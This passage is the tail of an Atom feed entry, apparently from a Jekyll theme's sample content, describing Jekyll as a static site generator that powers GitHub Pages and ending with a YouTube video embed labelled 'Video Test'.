<h3 id="so-what-is-jekyll-exactlypermalink">So what is Jekyll, exactly?Permalink</h3>

<p>Jekyll is a simple, blog-aware, static site generator. It takes a template directory containing raw text files in various formats, runs it through a converter (like <a href="https://daringfireball.net/projects/markdown/">Markdown</a>) and our <a href="https://github.com/Shopify/liquid/wiki">Liquid</a> renderer, and spits out a complete, ready-to-publish static website suitable for serving with your favorite web server. Jekyll also happens to be the engine behind GitHub Pages, which means you can use Jekyll to host your project’s page, blog, or website from GitHub’s servers for free.</p>

<h3 id="helpful-hintspermalink">Helpful HintsPermalink</h3>

<p>Throughout this guide there are a number of small-but-handy pieces of information that can make using Jekyll easier, more interesting, and less hazardous. Here’s what to look out for.</p>

<h3 id="video-test">Video Test</h3>

<iframe type="text/html" width="100%" height="385" src="http://www.youtube.com/embed/gfmjMWjn-Xg" frameborder="0"></iframe>]]></content><author><name>Jekyll</name></author><category term="jekyll" /><summary type="html"><![CDATA[Transform your plain text into static websites and blogs.]]></summary></entry></feed>